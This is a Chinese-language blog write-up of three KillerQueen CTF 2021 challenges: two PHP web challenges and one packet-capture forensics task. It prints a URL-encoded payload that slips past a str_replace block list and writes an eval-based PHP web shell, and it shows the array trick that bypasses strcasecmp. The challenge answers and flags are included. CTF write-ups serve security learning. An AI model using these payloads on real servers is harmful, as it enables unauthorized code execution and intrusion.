---
title: "KillerQueenCTF2021 Wp"
slug: "killerqueenctf2021-wp"
description: "water ,water, water..."
date: 2021-11-07T14:39:15+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

## web/Just Not My Type

> I really don't think we're compatible ([Link](http://143.198.184.186:7000/))

```php
<?php
$FLAG = "shhhh you don't get to see this locally";

if ($_SERVER['REQUEST_METHOD'] === 'POST')
{
    $password = $_POST["password"];
    if (strcasecmp($password, $FLAG) == 0)
    {
        echo $FLAG;
    }
    else
    {
        echo "That's the wrong password!";
    }
}
?>
```

我们的老朋友`strcasecmp()`函数，它和`strcmp()`函数一样用于比较两个字符串，区别是后者会区分大小写；绕过方式是传入数组，这样会使两个函数无法处理而返回null

![image-20211030104447923](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211030104447923.png)

`flag{no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible}`

## web/PHat Pottomed Girls

> Now it's attempt number 3 and this time with a Queen reference! (flag is in the root directory) ([Link](http://143.198.184.186:7001/))

```php
<?php
session_start();

function generateRandomString($length = 15) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function filter($originalstring)
{
    $notetoadd = str_replace("<?php", "", $originalstring);
    $notetoadd = str_replace("?>", "", $notetoadd);
    $notetoadd = str_replace("<?", "", $notetoadd);
    $notetoadd = str_replace("flag", "", $notetoadd);

    $notetoadd = str_replace("fopen", "", $notetoadd);
    $notetoadd = str_replace("fread", "", $notetoadd);
    $notetoadd = str_replace("file_get_contents", "", $notetoadd);
    $notetoadd = str_replace("fgets", "", $notetoadd);
    $notetoadd = str_replace("cat", "", $notetoadd);
    $notetoadd = str_replace("strings", "", $notetoadd);
    $notetoadd = str_replace("less", "", $notetoadd);
    $notetoadd = str_replace("more", "", $notetoadd);
    $notetoadd = str_replace("head", "", $notetoadd);
    $notetoadd = str_replace("tail", "", $notetoadd);
    $notetoadd = str_replace("dd", "", $notetoadd);
    $notetoadd = str_replace("cut", "", $notetoadd);
    $notetoadd = str_replace("grep", "", $notetoadd);
    $notetoadd = str_replace("tac", "", $notetoadd);
    $notetoadd = str_replace("awk", "", $notetoadd);
    $notetoadd = str_replace("sed", "", $notetoadd);
    $notetoadd = str_replace("read", "", $notetoadd);
    $notetoadd = str_replace("system", "", $notetoadd);

    return $notetoadd;
}

if(isset($_POST["notewrite"]))
{
    $newnote = $_POST["notewrite"];

    //3rd times the charm and I've learned my lesson. Now I'll make sure to filter more than once :)
    $notetoadd = filter($newnote);
    $notetoadd = filter($notetoadd);
    $notetoadd = filter($notetoadd);

    $filename = generateRandomString();
    array_push($_SESSION["notes"], "$filename.php");
    file_put_contents("$filename.php", $notetoadd);
    header("location:index.php");
}
?>
```

简单看一下流程，`filter()`函数会对我们post传入的notewrite参数（也就是会被写入的文件内容）进行比较严格的过滤，文件名是`generateRandomString()`生成的随机名字，但是不重要，它会自动拼上.php的后缀并且把名字写到`session['notes']`中；所以我们唯一需要处理的就是`filter()`函数的绕过了

尴尬的是这个`filter()`跟个筛子一样……首先是没有过滤`eval()`，其次是`str_replace()`也是水的一批

payload:

```
notewrite=%3C%3C%3C%3C%3F%3F%3F%3Fphp+%40eval%28%24_POST%5B%27wuhu%27%5D%29%3B
```

之后连上蚁剑即可查看根目录下的flag.php

`flag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}`

## forensics/Obligatory Shark

> remember to wrap the flag

看tcp流，telnet明文流量

![image-20211030120130169](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211030120130169.png)

33a465747cb15e84a26564f57cda0988

![image-20211107144316344](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107144316344.png)

`flag{dancingqueen}`

